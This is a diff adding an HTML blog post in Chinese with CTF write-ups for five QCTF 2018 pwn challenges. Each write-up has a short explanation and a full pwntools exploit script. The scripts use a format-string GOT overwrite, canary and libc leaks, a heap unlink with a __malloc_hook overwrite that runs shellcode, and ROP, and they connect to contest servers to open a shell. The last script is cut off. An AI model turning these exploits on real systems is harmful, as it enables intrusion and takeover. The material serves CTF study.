@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>qctf2018</title>
+  <meta name="description" content="简单的写一下，还有其他比赛，详细的到时候会发在博客">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/qctf2018.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">qctf2018</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>简单的写一下，还有其他比赛，详细的到时候会发在博客</p>
+
+<h2 id="notebook">notebook</h2>
+
+<p>这题估计非预期魔咒又发作了，里面那一堆代码根本没用上，直接<code class="prettyprint">snprintf</code>写<code class="prettyprint">printf</code>的GOT表，前面放个<code class="prettyprint">/bin/sh</code>然后后面<code class="prettyprint">printf</code>直接就getshell了。注意不能用<code class="prettyprint">%x</code>，因为<code class="prettyprint">/bin/sh</code>不能带参数，只能后面加很多空格，所以要找个空字符串。还有就是因为要判断<code class="prettyprint">snprintf</code>结果的长度跟之前存的相等，不然不会调用<code class="prettyprint">printf</code>，所以要把结果长度写到那个全局变量里。</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">g_local</span><span class="o">=</span><span class="bp">False</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./notebook'</span><span class="p">)</span><span class="c">#env={'LD_PRELOAD':'./libc.so.6'}</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"118.31.49.175"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"May I have your name?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"/bin/sh"</span> <span class="o">+</span> <span class="s">"</span><span class="si">%29</span><span class="s">$34233s</span><span class="si">%30</span><span class="s">$hn"</span> <span class="o">+</span> <span class="s">"</span><span class="si">%31</span><span class="s">$n</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804A094</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804A010</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804A08C</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="babycpp">babycpp</h2>
+
+<p><code class="prettyprint">get_array</code>里面有溢出，先增加num再<code class="prettyprint">do_unique</code>里面可以Leak出canary和libc（main的返回值在libc），因为unique函数会把元素“往前拉”，拉到20个以内就在输出的范围内了。然后具体是哪个下标是通过调试得出的。最后用那个<code class="prettyprint">[rsp+0x30] == NULL</code>的 <code class="prettyprint">one_gadget</code>，清空一下后面的栈让他条件满足</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">g_local</span><span class="o">=</span><span class="bp">True</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+<span class="n">START_MAIN_OFF</span> <span class="o">=</span> <span class="mh">0x20830</span>
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./babycpp'</span><span class="p">)</span><span class="c">#env={'LD_PRELOAD':'./libc.so.6'}</span>
+    <span class="c">#gdb.attach(sh)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"118.31.49.175"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">init_n</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"input n:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_array</span><span class="p">(</span><span class="n">arr</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"input "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" num:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">arr</span><span class="p">:</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">change_num</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">unique</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">arr</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">split</span> <span class="o">=</span> <span class="n">arr</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span><span class="n">split</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">split</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="n">init_n</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="c">#------------leak cookie---------------</span>
+<span class="n">get_array</span><span class="p">([</span><span class="mi">2019</span><span class="p">]</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">change_num</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span>
+<span class="n">arr</span> <span class="o">=</span> <span class="n">unique</span><span class="p">()</span>
+
+<span class="n">cookie</span> <span class="o">=</span> <span class="p">(</span><span class="n">arr</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">arr</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="p">((</span><span class="n">arr</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">arr</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">))</span> <span class="o">-</span> <span class="n">START_MAIN_OFF</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">)</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+<span class="n">change_num</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">22</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">arr</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="n">arr</span><span class="p">[</span><span class="mi">12</span><span class="p">]]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="p">[(</span><span class="n">one_gadget</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="p">(</span><span class="n">one_gadget</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)]</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">get_array</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="noleak">NoLeak</h2>
+
+<p>这题估计非预期魔咒又发作，我的解法成功率只有<code class="prettyprint">1/16</code>。人品好跑个两三次就能getshell，不好差不多跑个20多次也能成功。</p>
+
+<p>漏洞点一个UAF，一个往后溢出。</p>
+
+<p>首先<code class="prettyprint">.bss</code>可写可执行，所以<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c">Unlink</a>先拿到任意写，然后写shellcode，这是第一步。</p>
+
+<p>第二步因为不能leak，所以要想好办法劫持<code class="prettyprint">rip</code>，我最后决定是写<code class="prettyprint">__malloc_hook</code>，因为这个全局变量就在<code class="prettyprint">unsorted bin</code>前面一点点，所以可以用0day安全一书中的覆盖小端部分字节来绕过ASLR的思路，但是只写一个字节成功不了，因为没那么近，又不可能写3个nibble（4位），所以只能写2个字节，第四个<code class="prettyprint">nibble</code>随便设，所以说成功率<code class="prettyprint">1/16</code>。</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">g_local</span><span class="o">=</span><span class="bp">True</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+<span class="n">START_MAIN_OFF</span> <span class="o">=</span> <span class="mh">0x20830</span>
+<span class="n">BUF_ADDR</span> <span class="o">=</span> <span class="mh">0x601040</span>
+<span class="n">SHELL_CODE_ADDR</span> <span class="o">=</span> <span class="mh">0x601800</span>
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./NoLeak'</span><span class="p">)</span><span class="c">#env={'LD_PRELOAD':'./libc.so.6'}</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"118.31.49.175"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="s">"A"</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
+
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
+
+<span class="c"># unlink to write shellcode------------------------------</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="c">#0</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x110</span><span class="p">)</span> <span class="c">#1</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">unlink_payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span>
+<span class="n">unlink_payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BUF_ADDR</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">BUF_ADDR</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">unlink_payload</span> <span class="o">+=</span> <span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x100</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">unlink_payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x220</span><span class="o">-</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x220</span><span class="p">,</span> <span class="n">unlink_payload</span><span class="p">)</span> <span class="c">#2</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="c">#buf[0] = 0x601028 = &amp;buf - 0x18</span>
+<span class="n">update</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">SHELL_CODE_ADDR</span><span class="p">))</span>
+<span class="n">update</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span> <span class="p">,</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">(),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span><span class="p">))</span>
+<span class="c"># Top Chunk: 0xaeb010</span>
+<span class="c"># Last Remainder: 0</span>
+
+<span class="c"># 0xaeb000 PREV_INUSE {</span>
+<span class="c">#   prev_size = 0,</span>
+<span class="c">#   size = 561,</span>
+<span class="c">#   fd = 0x0,</span>
+<span class="c">#   bk = 0x20ff1,</span>
+<span class="c">#   fd_nextsize = 0x601028,</span>
+<span class="c">#   bk_nextsize = 0x601030</span>
+<span class="c"># }</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span> <span class="c">#3</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">)</span> <span class="c">#4</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x170</span><span class="p">))</span> <span class="c">#5</span>
+<span class="c">#0x170是预先放好的prev_size</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="c">#此时Bins中有一个unsorted bin和一个0x70的fastbin</span>
+
+<span class="n">update</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x70</span> <span class="p">,</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x68</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x171</span><span class="p">))</span>
+<span class="c">#这里往后溢出改写unsorted bin的大小</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">)</span> <span class="c">#6</span>
+<span class="c">#分配一个chunk，此时unsorted bin和那个0x70的fastbin重合</span>
+<span class="c">#所以0x70的fastbin的fd是unsorted bin的指针</span>
+
+<span class="n">update</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x8b10</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span> <span class="c"># 0x?b10，成功率1/16</span>
+<span class="c">#把它改成__malloc_hook前面的某个地址</span>
+<span class="c">#这里利用的是0x7f伪造fastbin大小的技巧，网上很多资料不详细说了</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">SHELL_CODE_ADDR</span><span class="p">))</span>
+<span class="c">#分配两次，把__malloc_hook写成shellcode地址</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="dice-game">Dice Game</h2>
+
+<p>溢出把种子设为0，然后随机数就可以预测了（PS：其实这题没溢出也能做，因为<code class="prettyprint">time(0)</code>是可预测的。。。）</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">g_local</span><span class="o">=</span><span class="bp">False</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./dice_game'</span><span class="p">)</span><span class="c">#env={'LD_PRELOAD':'./libc.so.6'}</span>
+    <span class="c">#gdb.attach(sh)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"47.96.239.28"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+
+<span class="n">ans</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span> <span class="c">#写个简单的C语言程序可以获取到这个</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" let me know your name: "</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Give me the point(1~6): "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="stack2">stack2</h2>
+
+<p>数组越界栈任意写，所以可以跳过cookie直接构造ROP，<code class="prettyprint">/bin/bash</code>那个是坑。。。但是幸运的是<code class="prettyprint">sh</code>就在那个字符串里面，能直接执行。。。</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">g_local</span><span class="o">=</span><span class="bp">True</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./stack2'</span><span class="p">)</span><span class="c">#env={'LD_PRELOAD':'./libc.so.6'}</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"47.96.239.28"</span><span class="p">,</span> <span class="mi">2333</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write_byte</span><span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
